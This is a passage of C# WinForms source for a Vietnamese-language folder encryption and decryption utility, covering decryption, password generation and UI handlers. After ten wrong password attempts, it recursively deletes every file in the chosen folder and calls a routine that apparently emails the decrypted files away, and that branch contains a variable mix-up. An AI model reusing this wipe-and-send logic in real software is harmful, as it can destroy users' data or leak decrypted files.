                                File.Delete(item.FullName);
                            }
                        }

                        SendMailFolder();

                        MessageBox.Show("Bạn đã nhập sai mật khẩu quá 10 lần. \n\nVì lí do bảo mật, chúng tôi sẽ tự động xoá tập tin này để đảm bảo an toàn tập tin cho chủ sỡ hữu của tập tin. Một thông báo email kèm theo tập tin đã được giải mã đã được gửi đến chủ sở hữu và tập tin đã bị xoá khỏi máy tính này!",
                            "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Warning);

                        // OK, delete all files
                        File.Delete("fsIn.txt");
                        File.Delete("fsOut.txt");
                        File.Delete("temp1.tmp");
                        File.Delete("temp2.tmp");
                        File.Delete("encrypted_files.dat.aes");

                        // Delete all file in folder
                        try
                        {
                            DirectoryInfo folderDelete = new DirectoryInfo(txtInputFolder.Text);

                            foreach (FileInfo item in folder.GetFiles("*.*", SearchOption.AllDirectories))
                            {
                                if (File.Exists(item.FullName))
                                {
                                    File.Delete(item.FullName);
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            // If throw an exception
                            MessageBox.Show("Error at: " + ex.Message, "Error");
                        }

                        lblStatusBar.Text = "Sẵn sàng";
                        tabControl.Enabled = true;

                        btnClose.Enabled = true;
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("Application exited with code 1\n\nApplication special exception:\n\n" + ex.ToString(), "Error");
                        Application.Exit();
                    }
                }
            }
            else
            {
                lblStatusBar.Text = "Đang giải mã các file trong thư mục " + txtInputFolder.Text;
                tabControl.Enabled = false;

                btnClose.Enabled = false;

                if (txtInputFolder.Text == "" || txtInputFolder.Text == null)
                {
                    MessageBox.Show("Vui lòng truyền vào đường dân đến nơi lưu tệp tin/thư mục mà bạn muốn lưu lại sau khi giải mã!",
                        "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    try
                    {
                        DirectoryInfo folder = new DirectoryInfo(txtInputFolder.Text);

                        foreach (FileInfo item in folder.GetFiles("*.aes", SearchOption.AllDirectories))
                        {
                            if (File.Exists(item.FullName))
                            {
                                AESEncryptDecrypt.FileDecrypt(item.FullName, item.FullName.Replace(".aes", ""), pass);
                            }
                        }

                        MessageBox.Show("Đã giải mã toàn bộ file trong thư mục " + txtInputFolder.Text + " hoàn tất!", "Thông báo");
                        lblStatusBar.Text = "Sẵn sàng";
                        tabControl.Enabled = true;

                        btnClose.Enabled = true;

                        DirectoryInfo Deletefolder = new DirectoryInfo(txtInputFolder.Text);

                        foreach (FileInfo item in Deletefolder.GetFiles("*.aes", SearchOption.AllDirectories))
                        {
                            if (File.Exists(item.FullName))
                            {
                                File.Delete(item.FullName);
                            }
                            else
                            {
                                MessageBox.Show("FATAL ERROR: Dumped file" + item.FullName + "\nApplication aborted and will be restart now!");
                                Application.Restart();
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("Application exited with code 1\n\nApplication special exception:\n\n" + ex.Message, "Error");
                        Application.Exit();
                    }
                }
            }
            if (File.Exists("temp1_folder.tmp"))
            {
                File.Delete("temp1_folder.tmp");
            }
            else
            {
                MessageBox.Show("FATAL ERROR: Couldn't find a file: temp1_folder.tmp. Application will be restart now!", "Lỗi",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);

                Application.Restart();
            }

            // Collecting Heap
            GC.Collect();
            GC.WaitForPendingFinalizers();
            GC.Collect();
        }

        private void btnBrowseFolder_Click(object sender, EventArgs e)
        {
            lblStatusBar.Text = "Đang chọn thư mục....";
            tabControl.Enabled = false;

            CommonOpenFileDialog dialog = new CommonOpenFileDialog
            {
                InitialDirectory = "C:\\Users",
                IsFolderPicker = true
            };

            if (dialog.ShowDialog() == CommonFileDialogResult.Ok)
            {
                txtInputFolder.Text = dialog.FileName;
                lblStatusBar.Text = "Đã chọn thư mục " + txtInputFolder.Text;
            }

            tabControl.Enabled = true;
            lblStatusBar.Text = "Sẵn sàng";

            // Collecting Heap
            GC.Collect();
            GC.WaitForPendingFinalizers();
            GC.Collect();
        }

        double opacity;
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            tabControl.Enabled = false;

            // Clear all data in Clipboard
            Clipboard.Clear();

            // Collecting Heap
            GC.Collect();
            GC.WaitForPendingFinalizers();
            GC.Collect();

            // Delete Files have created by launcher
            File.Delete("LAUNCHER");

            int loopctr = 0;

            opacity = this.Opacity;

            for (loopctr = 100; loopctr >= 5; loopctr -= 10)
            {
                this.Opacity = loopctr / 95.0;
                this.Refresh();

                Thread.Sleep(100);
            }

            // Exit Application
            Application.Exit();

            Console.WriteLine("Application Exiting... Please wait....");
            Console.WriteLine("Applicaton Exited");
        }

        private void btnRefreshPassword_Click(object sender, EventArgs e)
        {
            lblStatusBar.Text = "Đang tạo mới lại mật khẩu mã hóa/giải mã file/folder.....";
            tabControl.Enabled = false;

            // Delete old password from text box before re-create a new password
            txtPassword.Text = null;

            string pass = RandomString(64);

            lblStatusBar.Text = "Sẵn sàng";
            tabControl.Enabled = true;
            txtPassword.Text = pass;
        }

        private void picIcon_Click(object sender, EventArgs e)
        {
            lblStatusBar.Text = "Đang làm mới ứng dụng......";
            tabControl.Enabled = false;

            // Collecting Heap
            GC.Collect();
            GC.WaitForPendingFinalizers();
            GC.Collect();

            // Sleep in 5 seconds, and then put application back to normal
            Thread.Sleep(TimeSpan.FromSeconds(5));

            lblStatusBar.Text = "Sẵn sàng";
            tabControl.Enabled = true;
        }

        /// <summary>
        /// Information Application
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ptbInformation_Click(object sender, EventArgs e)
        {
            lblStatusBar.Text = "Đang ở cửa sổ xem thông tin ứng dụng và các thành phần liên quan......";
            tabControl.Enabled = false;

            var f4 = new Form4();
            MaskedDialog.ShowDialog(this, f4);
            f4.Dispose();
            f4 = null;

            //Form4 frmInfo = new Form4();
            //frmInfo.ShowDialog();

            lblStatusBar.Text = "Sẵn sàng";
            tabControl.Enabled = true;

            // Collecting Heap
            GC.Collect();
            GC.WaitForPendingFinalizers();
            GC.Collect();
        }

        private void lnkMinimize_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void lnkClose_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            this.Close();
        }

        #region Get Current Mouse Postition
        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int x; // X postition
            public int y; // Y postition

            public static implicit operator Point(POINT point)
            {
                return new Point(point.x, point.y);
            }
        }

        /// <summary>
        /// Retrieves the cursor's postition, in screen coordinates
        /// </summary>
        /// <see>Please see MDN documentation for further information</see>
        [DllImport("user32.dll")]
        public static extern bool GetCursorPos(out POINT lpPoint);
        public static Point GetCursorPostition()
        {
            POINT lpPoint;
            GetCursorPos(out lpPoint);

            // We need error handling now, so we need to create a bool and get status
            // of GetCursorPos. If GetCursorPos() function have returned a value not 
            // null, it seems success. If GetCursorPos() function have returned a value
            // and its null, it seems failed.

            bool isSuccess = GetCursorPos(out lpPoint);

            if (!isSuccess)
            {
                MessageBox.Show("Oops, error when getting cursor postition!");
            }

            return lpPoint;
        }
        #endregion

        #region Move Form without FormBorderStyle
        private const int WM_NCLBUTTONDOWN = 0x00A1;

        private const int HTCAPTION = 2;

        private void LblTitle_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                lblTitle.Capture = false;

                Message msg =
                    Message.Create(this.Handle,
                        WM_NCLBUTTONDOWN,
                        new IntPtr(HTCAPTION),
                        IntPtr.Zero);

                this.DefWndProc(ref msg);
            }

            if (e.Button == MouseButtons.Right)
            {
                Point ptLowerText = GetCursorPostition();
                contextMenuStrip1.Show(ptLowerText);
            }
        }
        #endregion

        #region Enable Minimize feature when click icon in taskbar
        private const int WS_MINIMIZEBOX = 0x20000;

        private const int CS_DBLCLICKS = 0x8;

        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.Style |= WS_MINIMIZEBOX;
                cp.ClassStyle |= CS_DBLCLICKS;

                return cp;
            }
        }
        #endregion

        private void minimizeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        #region Old Function
        private void btnClose_MouseHover(object sender, EventArgs e)
        {
            btnClose.TextColor = HexColorUtil.HexToColor("#000000");
            btnClose.BackgroundColor = HexColorUtil.HexToColor("#ff3b3b");
            btnClose.BorderColor = HexColorUtil.HexToColor("#ff3b3b");

            btnClose.Text = "X";

            btnClose.Text = "";
            btnClose.BackgroundColor = Color.Red;
            btnClose.BorderColor = Color.Red;
        }

        private void btnMinimize_MouseHover(object sender, EventArgs e)
        {
            btnMinimize.TextColor = HexColorUtil.HexToColor("#000000");
            btnMinimize.BackgroundColor = HexColorUtil.HexToColor("#ffb73b");
            btnMinimize.BorderColor = HexColorUtil.HexToColor("#ffb73b");

            btnMinimize.Text = "-";

            btnMinimize.Text = "";
            btnMinimize.BackgroundColor = Color.Orange;
            btnMinimize.BorderColor = Color.Orange;
        }
        #endregion

        #region Window Controls Button Event Clicked
        private void btnClose_Clicked(object sender, EventArgs e)
        {
            btnClose.Text = "x";

            btnClose.TextColor = HexColorUtil.HexToColor("#000000");
            btnClose.BackgroundColor = HexColorUtil.HexToColor("#8a0000");
            btnClose.BorderColor = HexColorUtil.HexToColor("#8a0000");

            btnClose.Text = "x";

            //Thread.Sleep(100);

            //btnClose.Text = "";
            //btnClose.BackgroundColor = Color.Red;
            //btnClose.BorderColor = Color.Red;

            this.Close();
        }

        private void btnMinimize_Clicked(object sender, EventArgs e)
        {
            btnMinimize.Text = "-";

            btnMinimize.TextColor = HexColorUtil.HexToColor("#000000");
            btnMinimize.BackgroundColor = HexColorUtil.HexToColor("#9c6300");
            btnMinimize.BorderColor = HexColorUtil.HexToColor("#9c6300");

            btnMinimize.Text = "-";

            WindowState = FormWindowState.Minimized;

            Thread.Sleep(100);

            btnMinimize.Text = "";
            btnMinimize.BackgroundColor = Color.Orange;
            btnMinimize.BorderColor = Color.Orange;
        }
        #endregion

        #region Event Window Controls Button MouseEnter and MouseLeave
        private void btnMinimize_MouseEnter(object sender, EventArgs e)
        {
            btnMinimize.TextColor = HexColorUtil.HexToColor("#000000");
            btnMinimize.BackgroundColor = HexColorUtil.HexToColor("#ffb73b");
            btnMinimize.BorderColor = HexColorUtil.HexToColor("#ffb73b");

            btnMinimize.Text = "-";
        }

        private void btnMinimize_MouseLeave(object sender, EventArgs e)
        {
            btnMinimize.Text = "";
            btnMinimize.BackgroundColor = Color.Orange;
            btnMinimize.BorderColor = Color.Orange;
        }

        private void btnClose_MouseEnter(object sender, EventArgs e)
        {
            btnClose.TextColor = HexColorUtil.HexToColor("#000000");
            btnClose.BackgroundColor = HexColorUtil.HexToColor("#ff3b3b");
            btnClose.BorderColor = HexColorUtil.HexToColor("#ff3b3b");

            btnClose.Text = "x";
        }

        private void btnClose_MouseLeave(object sender, EventArgs e)
        {
            btnClose.Text = "";
            btnClose.BackgroundColor = Color.Red;
            btnClose.BorderColor = Color.Red;
        }
        #endregion
    }
}
